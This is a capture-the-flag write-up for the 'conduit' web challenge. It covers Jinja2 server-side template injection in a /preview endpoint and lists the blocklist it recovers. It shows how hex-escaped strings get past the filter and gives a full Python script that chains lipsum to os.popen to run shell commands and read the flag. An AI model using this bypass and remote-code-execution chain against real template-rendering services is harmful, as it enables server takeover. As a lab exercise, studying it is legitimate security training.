---
title: "conduit"
ctf: "CryoVault Finals"
date: 2026-10-24
category: web
difficulty: hard
points: 500
flag_format: "isfcr{...}"
author: ""
---

# conduit

## Summary

The `/preview` endpoint passes the user-controlled `label` straight into `render_template_string()`, giving Jinja2 SSTI. A case-insensitive substring blocklist rejects the usual escape tokens, so the exploit builds every forbidden name at runtime from `\xNN` string escapes.

## Solution

### Step 1: Confirm SSTI and map the blocklist

`{"label":"{{7*7}}"}` renders `49` (and `{{7*'7'}}` renders `777777777`), confirming Jinja2. Fuzzing shows a case-insensitive substring filter returning `400 blocked token: <word>`. Recovered blocklist:

```
__  class  mro  subclass  subprocess  popen  system  import
config  request  eval  exec  os  builtins  globals
```

Because the check runs on the raw JSON string, `"os"`, `"popen"`, `"__"` etc. can never appear literally, even inside quotes.

### Step 2: Build forbidden names with escape sequences

Jinja2 string literals support `\xNN`, and the filter only inspects the source text. `'\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'` decodes to `__globals__` at render time while the raw payload contains no banned substring. The `lipsum` global is exported by default, so:

`lipsum | attr(__globals__) | attr(__getitem__)(__builtins__) | attr(__getitem__)(__import__)(os) | attr(popen)(cmd) | attr(read)()`

reaches `os.popen(...).read()` with no blocked token in the request.

```python
#!/usr/bin/env python3
import re
import requests

URL = "https://isfcrpesu-conduit.chals.io/preview"

def hexesc(s):
    """Encode as Jinja2/Python hex escapes so no blocklisted word appears."""
    return "".join("\\x%02x" % ord(c) for c in s)

def build_payload(cmd):
    return (
        "{{lipsum"
        "|attr('%s')|attr('%s')('%s')"
        "|attr('%s')('%s')('%s')"
        "|attr('%s')('%s')|attr('%s')()}}"
        % (
            hexesc("__globals__"), hexesc("__getitem__"), hexesc("__builtins__"),
            hexesc("__getitem__"), hexesc("__import__"), hexesc("os"),
            hexesc("popen"), cmd, hexesc("read"),
        )
    )

def rce(cmd):
    r = requests.post(URL, json={"label": build_payload(cmd)}, timeout=30)
    r.raise_for_status()
    body = r.text.split("<b>", 1)[1].rsplit("</b>", 1)[0]
    return (body.replace("&lt;", "<").replace("&gt;", ">")
                .replace("&#34;", '"').replace("&#39;", "'").replace("&amp;", "&"))

assert "49" in requests.post(URL, json={"label": "{{7*7}}"}, timeout=20).text

for path in ("/chall/flag.txt", "/flag.txt", "/flag", "/app/flag.txt"):
    m = re.search(r"isfcr\{[^}]*\}", rce("cat %s 2>/dev/null" % path))
    if m:
        print(m.group(0))
        break
```

### Step 3: Read the flag

Running the script executes `cat /chall/flag.txt` through `os.popen` and prints the flag.

## Flag

```
isfcr{ss71_h3x_f1lt3r_byp4ss_c0ndu1t_e4d1}
```
